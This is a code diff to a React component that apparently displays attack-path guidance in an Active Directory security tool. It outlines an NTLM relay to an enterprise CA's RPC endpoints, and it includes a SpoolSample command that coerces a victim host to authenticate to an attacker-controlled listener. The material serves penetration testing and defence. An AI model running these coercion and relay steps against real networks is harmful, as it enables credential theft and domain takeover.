@@ -16,25 +16,17 @@
 
 import { Link, Typography } from '@mui/material';
 import { FC } from 'react';
+import { EdgeInfoProps } from '../index';
 
-const LinuxAbuse: FC = () => {
+const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
-            <Typography variant={'body2'}>
-                1. Start the Relay Server The NTLM relay can be executed with{' '}
-                <Link
-                    target='_blank'
-                    rel='noopener'
-                    href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
-                    ntlmrelayx.py
-                </Link>
-                . To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and
-                use the arguments:
+            <Typography variant='body2'>
+                1: Start the Relay Server The NTLM relay can be executed with tools like Inveigh or ntlmrelayx.py,
+                targeting the RPC endpoints of the enterprise CA server.
             </Typography>
-            <Typography component={'pre'}>{'--adcs --template <TEMPLATE_NAME>'}</Typography>
-
-            <Typography variant={'body2'}>
-                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+            <Typography variant='body2'>
+                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -44,11 +36,8 @@ const LinuxAbuse: FC = () => {
                 . Examples of tools include:
                 <ul>
                     <li>
-                        <Link
-                            target='_blank'
-                            rel='noopener'
-                            href='https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'>
-                            printerbug.py
+                        <Link target='_blank' rel='noopener' href='https://github.com/leechristensen/SpoolSample'>
+                            SpoolSample
                         </Link>
                     </li>
                     <li>
@@ -58,12 +47,24 @@ const LinuxAbuse: FC = () => {
                     </li>
                 </ul>
             </Typography>
-            <Typography variant={'body2'}>
+            <Typography variant='body2'>
                 To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>.
+                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+            </Typography>
+            <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
+            <Typography variant='body2'>
+                3: Relay to RPC Endpoints The relayed authentication is directed to the RPC endpoints of the vulnerable
+                enterprise CA server. This requires that RPC encryption is not enforced on the target CA.
+            </Typography>
+            <Typography variant='body2'>
+                4: Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
+                    Rubeus
+                </Link>
+                .
             </Typography>
         </>
     );
 };
 
-export default LinuxAbuse;
+export default WindowsAbuse;
